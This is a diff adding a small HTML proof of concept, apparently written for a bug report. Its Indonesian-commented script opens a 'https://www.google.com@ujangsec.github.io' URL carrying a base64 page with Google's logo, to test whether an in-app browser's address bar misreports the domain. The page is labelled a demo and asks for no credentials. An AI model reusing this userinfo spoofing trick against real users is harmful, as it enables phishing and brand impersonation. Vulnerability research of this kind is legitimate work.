@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+<body>
+  <button onclick="spoof()">Click to spoof</button>
+
+  <script>
+    // === Kamu bebas ganti isinya; ini aman (DEMO), tanpa minta kredensial ===
+    let payload = `
+      <div style="text-align:center; font-family:Arial, sans-serif; padding-top:24px">
+        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_160x56dp.png"
+             alt="Google Logo" width="160" height="56" />
+        <h1>THIS IS A DEMO — NOT GOOGLE</h1>
+        <p>Jika header di atas menampilkan <b>www.google.com</b> sementara halaman ini
+        jelas berasal dari domain saya, berarti ada <i>address bar misrepresentation</i>.</p>
+      </div>
+    `;
+
+    function spoof() {
+      // encode payload supaya bisa “dibawa” ke renderer
+      const b64 = btoa(unescape(encodeURIComponent(payload)));
+
+      // BUG VECTOR: userinfo (@) — jika IAB salah parse, header bisa tampil "www.google.com"
+      const url =
+        "https://www.google.com@" + "ujangsec.github.io" +
+        "/fb-iab-render.html#payload=" + b64 + "&vector=userinfo";
+
+      window.open(url, "_blank");
+    }
+  </script>
+</body>
+</html>
